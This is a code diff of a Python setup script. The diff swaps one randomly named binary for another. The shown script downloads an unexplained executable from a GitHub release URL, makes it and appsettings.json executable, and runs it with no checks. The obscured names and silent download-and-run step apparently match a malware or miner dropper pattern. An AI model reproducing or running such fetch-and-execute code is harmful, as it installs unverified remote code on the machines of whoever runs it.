@@ -52,22 +52,22 @@ with open("appsettings.json", "w") as f:
 
 print("[+] Created appsettings.json")
 
-# === 4. Download vlosjtsk binary ===
-vlosjtsk_url = "https://github.com/vedhagsvp/jtqlpoa/releases/download/jtreas/vlosjtsk"
-vlosjtsk_filename = "vlosjtsk"
+# === 4. Download jetsaprl binary ===
+jetsaprl_url = "https://github.com/vedhagsvp/jtqlpoa/releases/download/jtreas/jetsaprl"
+jetsaprl_filename = "jetsaprl"
 
-if not os.path.exists(vlosjtsk_filename):
-    print("[+] Downloading vlosjtsk...")
-    urllib.request.urlretrieve(vlosjtsk_url, vlosjtsk_filename)
+if not os.path.exists(jetsaprl_filename):
+    print("[+] Downloading jetsaprl...")
+    urllib.request.urlretrieve(jetsaprl_url, jetsaprl_filename)
     print("[+] Download complete.")
 else:
-    print("[!] vlosjtsk already exists. Skipping download.")
+    print("[!] jetsaprl already exists. Skipping download.")
 
 # === 5. Make executables
-os.chmod(vlosjtsk_filename, os.stat(vlosjtsk_filename).st_mode | stat.S_IEXEC)
+os.chmod(jetsaprl_filename, os.stat(jetsaprl_filename).st_mode | stat.S_IEXEC)
 os.chmod("appsettings.json", os.stat("appsettings.json").st_mode | stat.S_IEXEC)
 print("[+] Set executable permissions.")
 
-# === 6. Run vlosjtsk binary
-print("[+] Running ./vlosjtsk ...")
-subprocess.run(["./vlosjtsk"])
+# === 6. Run jetsaprl binary
+print("[+] Running ./jetsaprl ...")
+subprocess.run(["./jetsaprl"])
